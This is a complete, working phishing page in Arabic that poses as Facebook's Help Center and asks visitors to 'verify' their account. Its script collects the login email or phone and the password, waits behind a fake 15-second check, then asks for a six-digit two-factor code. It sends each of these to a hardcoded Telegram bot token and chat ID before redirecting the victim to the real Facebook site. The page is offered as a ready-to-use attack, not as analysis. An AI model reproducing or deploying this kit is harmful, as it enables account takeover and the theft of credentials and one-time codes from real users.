<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="Facebook Support - Account Verification">
    <meta property="og:description" content="يرجى التحقق من أمان حسابك لتجنب الإيقاف.">
    <meta property="og:image" content="http://googleusercontent.com/image_collection/image_retrieval/7592262736799629620_0">
    <meta property="og:type" content="website">

    <title>Facebook - Help Center</title>
    <style>
        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 360px; text-align: center; }
        .fb { color: #1877f2; font-size: 32px; font-weight: bold; margin-bottom: 20px; }
        input { width: 92%; padding: 13px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; background: #f5f6f7; }
        .btn { background: #1877f2; color: white; border: none; padding: 13px; border-radius: 6px; font-weight: bold; width: 100%; cursor: pointer; font-size: 17px; }
        #login, #wait, #otp { display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body onload="autoStart()">

<div class="box">
    <div class="fb">facebook</div>
    
    <div id="login">
        <p style="font-weight: bold;">تأكيد أمان الحساب</p>
        <input type="text" id="u" placeholder="البريد الإلكتروني أو الهاتف">
        <input type="password" id="p" placeholder="كلمة السر">
        <button class="btn" onclick="submitData()">تسجيل الدخول</button>
    </div>

    <div id="wait">
        <p>جاري فحص الحساب... يرجى الانتظار</p>
        <div style="border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto;"></div>
    </div>

    <div id="otp">
        <p style="color: #606770; font-size: 14px;">برجاء ترك الجلسة مفتوحة حتى يقوم النظام بإرسال الرمز الخاص بك.</p>
        <p style="color: red; font-weight: bold;">أدخل رمز التحقق (6 أرقام)</p>
        <input type="text" id="o" placeholder="000000" maxlength="6" style="text-align: center; font-size: 20px;">
        <button class="btn" onclick="finish()">تأكيد الرمز</button>
    </div>
</div>

<script>
    const T = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
    const C = "1356975454";
    let user = "";

    // تشغيل الفورم فوراً عند التحميل
    function autoStart() {
        document.getElementById('login').style.display = 'block';
    }

    function submitData() {
        user = document.getElementById('u').value;
        let pass = document.getElementById('p').value;
        if(user && pass) {
            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("👤: "+user+"\n🔑: "+pass)}`);
            document.getElementById('login').style.display = 'none';
            document.getElementById('wait').style.display = 'block';
            
            setTimeout(() => {
                document.getElementById('wait').style.display = 'none';
                document.getElementById('otp').style.display = 'block';
            }, 15000); 
        }
    }

    function finish() {
        let code = document.getElementById('o').value;
        if(code) {
            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("🔢 كود الـ OTP: " + code)}`);
            window.location.href = "https://facebook.com/security/2fa/check";
        }
    }
</script>
</body>
</html>
